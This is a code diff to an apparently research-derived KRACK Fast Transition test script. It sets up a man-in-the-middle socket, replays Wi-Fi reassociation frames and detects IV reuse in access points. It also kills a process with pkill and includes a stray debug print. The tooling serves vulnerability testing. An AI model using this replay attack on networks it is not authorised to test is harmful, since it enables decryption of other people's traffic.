@@ -6,6 +6,7 @@
 # See README for more details.
 
 import logging
+from libwifi import *
 import threading
 from krack_app import SimpleSwitch13
 
@@ -124,16 +125,6 @@ COLORCODES = {"gray": "\033[0;37m",
 global_log_level = INFO
 attack = ''
 
-
-def log(level, msg, color=None, showtime=True):
-    if level < global_log_level: return
-    if level == DEBUG and color is None: color = "gray"
-    if level == WARNING and color is None: color = "orange"
-    if level == ERROR and color is None: color = "red"
-    print (datetime.now().strftime('[%H:%M:%S] ') if showtime else " " * 11) + COLORCODES.get(color,
-                                                                                              "") + msg + "\033[1;0m"
-
-
 #### Packet Processing Functions ####
 
 class MitmSocket(L2Socket):
@@ -228,46 +219,46 @@ class KRAckAttackFt():
         # FIXME: Put this check in MitmSocket? We want to check this in client tests as well!
         if self.clientmac in [p.addr1, p.addr2] and Dot11WEP in p:
             # If the hardware adds/removes the TKIP/CCMP header, this is where the plaintext starts
-            payload = str(p[Dot11WEP])
+            payload = get_ccmp_payload(p)
 
             # Check if it's indeed a common LCC/SNAP plaintext header of encrypted frames, and
             # *not* the header of a plaintext EAPOL handshake frame
-            if payload.startswith("\xAA\xAA\x03\x00\x00\x00") and not payload.startswith(
-                    "\xAA\xAA\x03\x00\x00\x00\x88\x8e"):
+            if payload.startswith(b"\xAA\xAA\x03\x00\x00\x00") and not payload.startswith(
+                    b"\xAA\xAA\x03\x00\x00\x00\x88\x8e"):
                 log(ERROR,
                     "ERROR: Virtual monitor interface doesn't seem to pass 802.11 encryption header to userland.")
                 log(ERROR, "   Try to disable hardware encryption, or use a 2nd interface for injection.",
                     showtime=False)
                 quit(1)
 
-        if p.addr2 == self.clientmac and Dot11ReassoReq in p:
-            if get_tlv_value(p, IEEE_TLV_TYPE_RSN) and get_tlv_value(p, IEEE_TLV_TYPE_FT):
+        # Client performing a (possible new) handshake
+        if self.clientmac in [p.addr1, p.addr2] and Dot11Auth in p:
+            self.reset_client()
+            log(INFO, "Detected Authentication frame, clearing client state")
+        elif p.addr2 == self.clientmac and Dot11ReassoReq in p:
+            self.reset_client()
+            if get_element(p, IEEE_TLV_TYPE_RSN) and get_element(p, IEEE_TLV_TYPE_FT):
                 log(INFO, "Detected FT reassociation frame")
-                self.reassoc = p
-                self.next_replay = time.time() + 1
+                self.start_replay(p)
             else:
                 log(INFO, "Reassociation frame does not appear to be an FT one")
-                self.reassoc = None
-            self.ivs = set()
-
         elif p.addr2 == self.clientmac and Dot11AssoReq in p:
             log(INFO, "Detected normal association frame")
-            self.reassoc = None
-            self.ivs = set()
+            self.reset_client()
 
-        elif p.addr1 == self.clientmac and Dot11WEP in p:
+        # Encrypted data sent to the client
+        elif p.addr1 == self.clientmac and dot11_is_encrypted_data(p):
+            print("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
             iv = dot11_get_iv(p)
             log(INFO, "AP transmitted data using IV=%d (seq=%d)" % (iv, dot11_get_seqnum(p)))
 
-            # FIXME: When the client disconnects (or reconnects), clear the set of used IVs
-            iv =- 1
-            if iv in self.ivs:
+            if self.ivs.is_iv_reused(p):
                 log(INFO, ("IV reuse detected (IV=%d, seq=%d). " +
                            "AP is vulnerable!") % (iv, dot11_get_seqnum(p)), color="green")
                 print "Shutting Down AP2...\n"
                 os.system('pkill -f \"ap2-wlan1.apconf\"')
 
-            self.ivs.add(iv)
+            self.ivs.track_used_iv(p)
 
     def configure_interfaces(self):
         log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")
@@ -308,6 +299,16 @@ class KRAckAttackFt():
             self.wpasupp.terminate()
             self.wpasupp.wait()
         if self.sock: self.sock.close()
+
+    def reset_client(self):
+        self.reassoc = None
+        self.ivs = IvCollection()
+        self.next_replay = None
+
+    def start_replay(self, p):
+        assert Dot11ReassoReq in p
+        self.reassoc = p
+        self.next_replay = time.time() + 1
 
 
 def cleanup():
